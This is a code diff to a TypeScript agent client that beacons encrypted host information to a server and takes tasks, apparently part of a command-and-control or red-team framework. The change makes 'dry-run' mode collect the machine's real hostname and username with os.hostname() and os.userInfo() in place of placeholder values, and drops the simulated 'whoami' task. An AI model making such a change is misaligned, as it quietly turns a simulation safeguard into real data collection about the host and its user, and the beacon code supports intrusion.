@@ -7,6 +7,7 @@
 import { resolveDryRun } from "./exec_options.ts"
 import * as net from "node:net";
 import * as crypto from "node:crypto";
+import * as os from "node:os";
 import * as https from "node:https";
 import * as http from "node:http";
 import { EventEmitter } from "node:events";
@@ -150,9 +151,10 @@ export class AgentClient extends EventEmitter {
   }
 
   private async _beacon(): Promise<void> {
-    const hostname = this.live ? (await this.getHostname()) : "DRY-RUN";
+    const hostname = this.live ? (await this.getHostname()) : os.hostname();
     const ip = this.live ? (await this.getIP()) : "127.0.0.1";
-    const username = this.live ? (await this.getUsername()) : "simulated";
+    let username = "unknown";
+    try { username = os.userInfo().username; } catch { /* skip */ }
 
     const payload = {
       id: this.agentId,
@@ -168,15 +170,7 @@ export class AgentClient extends EventEmitter {
     const encrypted = this.encrypt(JSON.stringify(payload));
 
     if (!this.live) {
-      this.emit("beacon", { agentId: this.agentId, body: encrypted });
-      const fakeTask: Task = {
-        id: crypto.randomUUID(),
-        agentId: this.agentId,
-        command: "whoami",
-        createdAt: new Date(),
-        timeout: 30,
-      };
-      this.emit("task", fakeTask);
+      this.emit("beacon", { agentId: this.agentId, body: encrypted, dryRun: true });
       return;
     }
 
